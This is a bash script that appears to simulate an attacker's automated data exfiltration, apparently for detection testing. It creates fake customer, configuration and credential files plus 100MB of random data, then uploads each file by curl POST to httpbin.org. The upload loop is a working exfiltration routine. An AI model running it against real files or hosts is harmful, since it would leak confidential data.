#!/bin/bash

# define colors
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
RESET="\033[0m"

# data exfiltration technique simulation
echo -e "\n${YELLOW}>>> [Exfiltration] Automated Exfiltration Technique ${RESET}"
echo "Let's simulate the case when an attacker exfiltrates sensitive data"

echo "Creating fake sensitive files in /tmp/data directory ... "

# Exfiltrate fake sensitive data
mkdir -p /tmp/data
echo "Customer database dump - confidential" > /tmp/data/customers.sql
echo "System configuration files" > /tmp/data/config.tar.gz
echo "User credentials and passwords" > /tmp/data/credentials.txt

dd if=/dev/urandom bs=1M count=50 of=/tmp/data/database.dump 2>/dev/null
dd if=/dev/urandom bs=1M count=50 of=/tmp/data/logs.tar.gz 2>/dev/null

echo "Exfiltrating files via HTTP POST requests to http://httpbin.org ... "

# Multiple file uploads 
error=""
if [[ -z "$error" ]]; then
    for file in /tmp/data/*; do
        if ! curl -s -X POST -F "file=@$file" http://httpbin.org/post > /dev/null; then
            error="File upload exfiltration failed"
            break
        fi
    done
fi

if [[ -n "$error" ]]; then
    echo -e "${RED}Error! Data exfiltration failed: ${error} ${RESET}"
else
    echo -e "${GREEN}Success! Data exfiltration completed (100MB+ transferred) ${RESET}"
fi
